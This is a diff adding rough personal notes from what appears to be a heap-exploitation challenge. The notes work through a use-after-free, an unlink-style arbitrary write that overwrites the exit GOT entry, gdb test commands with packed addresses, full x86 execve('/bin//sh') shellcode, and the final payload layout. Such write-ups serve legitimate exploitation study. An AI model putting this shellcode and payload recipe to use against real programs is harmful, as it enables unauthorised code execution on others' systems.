@@ -1,0 +1,66 @@
+argv = contents of first malloc
+input @ gets = edx 
+
+Must enter a valid input address 
+will try to enter a heap addres
+
+Use gdb's <<< to enter hex values
+r test <<< $(python -c 'print "\x08\xe0\x04\x08"*4')
+
+Take note of eax+0xc, to control edx write, subtract 12 from the input address 
+
+HINT: use after free???
+input will be written to *first, argv[1] also wrote on *first
+- Test if the contents of argv[1] on *first still remains after being freed.
+
+0x804e008 - first contains A*4 B*4 C*4
+Note: UAF OCCURED!!! C*4 was not cleared
+Check what happens when gets(first) is executed
+
+gets(first) means that the attacker can control the contents of first heap chunk. Therefore, no need to UAF? (lol wrong idea)
+test @ gef:
+gef> r AAAABBBBCCCC <<< $(python -c 'print "\x08\xe0\x04\x08"*20')
+
+UAF happens since seventh chunk will be written to first due to first fit? - https://heap-exploitation.dhavalkapil.com/attacks/first_fit.html 
+
+It seems that the malloc used in the program is not from the libc - since it uses 0x804xxxx which is between 0x8048000 - 0x804e000
+
+input bytes:
+4 bytes = A
+4 bytes = B
+N bytes = contents of B
+
+overwrite A+12 with *B
+overwrite B+8 with *A
+
+overwrite got exit with heap address that contains a shellcode
+
+exit got - 0x804d02c
+
+breakpoint to *0x08048b22 before exit call to check if exit got is overwritten with 2nd 4 bytes (B)
+
+point leak to contentss of shellcode? add 0x8?
+
+cleaned up shellcode, added xor edx edx
+
+final shellcode:
+xor    eax,eax
+xor    edx,edx
+push   eax
+push   0x68732f2f
+push   0x6e69622f
+mov    ebx,esp
+push   eax
+push   ebx
+mov    ecx,esp
+mov    al,0xb
+int    0x80 
+
+https://defuse.ca/online-x86-assembler.htm#disassembly
+
+steps to pwn:
+get the pointer to first chunk leak
+get exit_got
+
+setup payload - [exit_got - 12][leak + 8][NOP * n][shellcode]
+Note: NOP to overwrite existing values on the heap
